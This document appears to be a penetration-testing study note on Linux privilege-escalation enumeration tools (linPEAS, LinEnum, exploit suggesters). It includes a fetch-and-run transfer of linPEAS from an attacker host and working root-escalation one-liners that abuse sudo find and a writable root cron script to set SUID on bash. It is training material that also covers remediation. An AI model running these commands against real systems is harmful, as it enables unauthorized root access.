# 002 Exploring Automated Tools

LinPeas - [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

LinEnum - [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Linux Exploit Suggester - [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

Linux Priv Checker - [https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)


## Important Principle
Automated tools do **three things**:
1. Save time
2. Highlight low-hanging fruit
3. Correlate findings you might miss

They do **NOT**:
- Think like an attacker
- Confirm exploitability
- Replace manual enumeration

A junior runs linPEAS and scrolls.  
A professional **interprets output and builds attack paths**.

---

# 1. LinPEAS (Primary Tool)
This is your **main weapon**.
## What it does:
- Massive enumeration script
- Highlights:
    - SUID
    - sudo
    - cron jobs
    - credentials
    - writable files
    - capabilities
    - kernel exploits
## How to use (real workflow)
### Transfer to target
On attacker machine:
`python3 -m http.server 8000`

On target:
`wget http://<your-ip>:8000/linpeas.sh`
`chmod +x linpeas.sh`
`./linpeas.sh`
## Output Interpretation (Critical)
LinPEAS uses colors:
- **RED/YELLOW** → High value
- **GREEN** → Informational
### Example 1: Sudo misconfig
```
User TCM can run:  
(root) NOPASSWD: /usr/bin/find
```
### Attack:
`sudo find . -exec /bin/sh \; -quit`
### Example 2: Writable cron job
`/opt/backup.sh writable by user`

### Attack:
Inject payload → wait for cron → root shell
### Example 3: Credentials
`/var/www/config.php → password=admin123`

### Attack:
- Login reuse
- SSH attempt
## Real-world mistake:
People run linPEAS and try everything randomly.

Correct approach:
- Pick **one strong finding**
- Build a **clean exploit path**

# 2. LinEnum
Older tool, but still useful.
## What it does:
- Basic enumeration
- Less noisy than linPEAS
- Easier to read
## When to use:
- When linPEAS output is overwhelming
- For quick checks in exams

## Execution:
```
chmod +x LinEnum.sh  
./LinEnum.sh
```
## Key sections to focus on:
- SUID files
- World-writable files
- Cron jobs
- User info

## Limitation:
- Doesn’t highlight issues as aggressively as linPEAS
# 3. Linux Exploit Suggester
Linux Exploit Suggester
## What it does:
- Matches kernel version → known exploits
## Usage:
`./linux-exploit-suggester.sh`

## Output example:
Possible Exploit:  
`[CVE-2016-5195] Dirty COW`
## Critical Thinking:
Just because it suggests:  
→ doesn’t mean it will work

## Real-world issues:
- Kernel patched but version not updated
- Exploit unstable
- Requires compilation tools not present

## Professional workflow:
1. Note exploit
2. Verify:
    - Is system vulnerable?
    - Is exploit reliable?
3. Try only if needed

# 4. Linux Priv Checker
## What it does:
- Python-based enumeration
- Similar to LinEnum
## Usage:
`python linuxprivchecker.py`
## When useful:
- When bash scripts are restricted
- When Python is available but limited tools exist
## Weakness:
- Outdated compared to linPEAS
- Less maintained
# 5. Professional Workflow (Real Engagement)
## Step 1: Manual Enumeration (always first)
- Identify obvious paths
- Understand system

## Step 2: Run linPEAS
./linpeas.sh

## Step 3: Extract Key Findings
You should categorize:
- Sudo
- SUID
- Credentials
- Writable files
- Services
- Capabilities
## Step 4: Build Attack Path
Example:
1. linPEAS shows:
    - writable `/opt/script.sh`
2. cron runs it as root
3. inject payload
4. get root
## Step 5: Validate
Don’t assume success. Always confirm:
```
id  
whoami
```
# 6. Real OSCP Strategy
Time matters.

### Efficient flow:
1. Run linPEAS early
2. Continue manual enumeration in parallel
3. Return to linPEAS output later

---

## What to prioritize in output:
High probability wins:
1. `sudo -l`
2. Credentials in files
3. Writable scripts run by root
4. SUID binaries
5. Capabilities

---

## What to deprioritize:
- Kernel exploits (unless stuck)
- Very complex chains early

---

# 7. Common Mistakes
### 1. Blind execution
Running exploits without understanding → system crash
### 2. Ignoring context
Tool shows issue, but:
- Not exploitable
- Not accessible
### 3. Missing simple wins
People chase kernel exploits and miss:
`sudo vim`

# 8. Real-World Example (End-to-End)
### linPEAS finds:
/opt/backup.sh writable  
cron runs every minute as root
### Attack:
`echo "chmod +s /bin/bash" >> /opt/backup.sh`

Wait → then:
`/bin/bash -p`

### Result:
Root shell
# 9. Remediation (Report Writing)
For automated findings, always include:

### 1. Misconfiguration
Explain clearly

### 2. Risk
Privilege escalation to root

### 3. Fix
- Remove write permissions
- Restrict sudo
- Patch kernel
- Secure credentials
# Final Professional Advice

Use tools like this:

- linPEAS → primary scanner
- LinEnum → backup clarity
- Exploit suggester → last resort
- PrivChecker → fallback

But always remember:

**Tools show symptoms. You find the exploit path.**

---
